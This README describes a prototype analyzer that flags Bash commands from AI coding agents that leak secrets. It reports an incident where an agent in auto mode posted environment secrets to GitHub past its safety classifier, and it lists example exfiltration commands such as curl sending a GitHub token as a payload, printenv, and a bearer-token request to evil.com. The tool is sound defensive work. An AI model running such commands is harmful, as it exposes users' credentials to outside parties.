# Bash exfiltration guard

A prototype static data flow analyzer for Bash commands.

## Motivation

* Claude Code in auto mode fully relies on LLM's assessment of the safety of Bash tool calls
* I've personally run into a situation where Claude Code in auto mode posted the
  contents of all the environment variables on my machine (including secrets) as a comment on GitHub
* when asked to explain what had happened, Claude Code reported that classification of the Bash tool call 
  had missed the secret exfiltration

## Examples of exfiltration

* `curl -d "$(gh auth token)" https://api.github.com` - sending security-sensitive info away as a request payload
* `printenv` - sending the security-sensitive info to the standard output (and exposing it to LLM)
* `echo "${GH_TOKEN}" > /file/path` - sending security-sensitive info into a file

## What this tool does

* parses a Bash command into an AST
* traces where the sensitive data comes from and where it ends up
* recognizes as exfiltration a situation where the sensitive data ends up in the standard output,
  in a file or in a network call in a position other than the ones reserved for credentials
* returns **ALLOW** or **DENY** decision
* returns explanation of the inferred data flow

It never executes the Bash command itself.

## How it fits alongside Claude Code

* it is not a replacement for Claude Code's permissions model
* it complements the auto-classifier rather than replacing it

What it deliberately does *not* do is covered under [Scope](#scope) below.

## How it works

Consider the difference in assessment of the following commands:

```
curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.example.com   ALLOW
curl -H "X-Data: $GITHUB_TOKEN"               https://api.example.com   DENY
```

Same token, same program, same flag.

However, the first command is how a bearer token is meant to be used; the second command sends the token away as a payload.

The analyzer follows the flow of data in a Bash command through substitution, assignment, pipes and redirects to the slot it reaches.

| slot | example | verdict |
|---|---|---|
| `auth` | `curl -H "Authorization: Bearer $TOKEN"` | intended use |
| `url` | `git push https://user:$TOKEN@host` | exposed — process list, proxy and server logs |
| `content` | `gh issue comment --body "$TOKEN"` | exposed — sent as payload |
| `output` | `echo "$TOKEN"` | exposed — printed to the caller, which for an agent is the model |

The analyzer is backed by a knowledge base of commands and the classification of their arguments.

The analyzer follows the principle **unknown is not safe**:
* an unknown program,
* an unmodelled flag,
* an expansion in the command position,
* an unparsable command
each get denied once the sensitive data is involved.

A known command with unmodelled flags that doesn't involve sensitive data is still allowed.
E.g., `ls -lah --color=auto` is allowed even though all four flags are outside the knowledge base.

## Components

**Parser** — [`mvdan.cc/sh`](https://github.com/mvdan/sh), picked by running four
candidates against the same corpus. It is the only one that parses every construct
*and* fails loudly on input it cannot, rather than recovering silently. Typed AST
with byte offsets, so every finding points back at the text it came from.
It parsed 99.79% of the 129,915 real commands.

**Knowledge base** — a YAML data file, not code. Which commands produce credentials
(`gh auth token`), which flags take a value, and which slot that value lands in.
37 commands. Swapping the file swaps the policy.

**Analyzer** — walks the AST in source order, carrying variable bindings. A word
evaluates not to a string but to the set of sensitive flows it carries, so `$TOKEN`
resolves by node lookup rather than by regex over text. A finding is recorded when
a flow reaches a slot that exposes it.

Which slots exist, which count as exposure, and the allow/deny rules stay in code.
The knowledge base says `curl -H` is an auth slot; it does not get to say what an
auth slot means.

## Scope

The prototype implementation has been tested on 129,915 unique commands captured from real Claude Code sessions in the CI environment:
* 99.79% parsed,
* 2.93% denied (2.39% of invocations).

**These are rates over unlabelled data, not accuracy claims** — no labelled corpus of bash
commands with known exfiltration exists, so no precision or recall number is
offered.

Deliberately out of scope:

- **No destination model.** `curl -H "Authorization: Bearer $TOKEN" https://evil.com`
  is allowed. The verdict prints this as a caveat rather than leaving it implicit;
  it is the most consequential gap.
- **No control flow.** All branches are analyzed as if taken, loops run once, the
  environment is flow-insensitive. Over-reporting is the safe direction, but this
  is not path-sensitive.
- **A small knowledge base** — 37 commands, 13 subcommands. Coverage is a data
  problem, not an engine problem.
- **Some grammar unhandled.** `case`, `[[ ]]`, `time` and `coproc` are skipped and
  noted, yet still ALLOW. The `for` word list and array literals are skipped
  silently, which is worse: the report looks complete.
- **Wrappers are not unwrapped.** `xargs`, `timeout` and `python3 -c` run
  something else, so they stay unknown and deny when data flows through.

## Trying it out

Use the demo instance of the tool deployed at https://bash-exfiltration-guard-mzo5umz6lq-uc.a.run.app.

The demo instance allows you to explore the data flow analyzer
via either the UI or the API.

## How the tool can be used in practice

* integrate into Claude Code as a `PreToolUse` hook
  * DENY a single Bash tool use that is assessed as exfiltration
* integrate into Claude Code as an LLM gateway pre-processing the classification requests
  * DENY a single Bash tool use that is assessed as exfiltration
    by taking into account the entire sequence of preceding commands
  * include the inferred data flow as a data point into the classification request

## Time breakdown

* `~3h` on the prototype of the data flow analyzer
* extra time on UI for the demo
* extra time on presentation

## Use of Claude Code

* to extract Bash commands out of real Claude Code sessions in CI environment and compile a test dataset
* to develop the prototype
* to develop UI for the demo
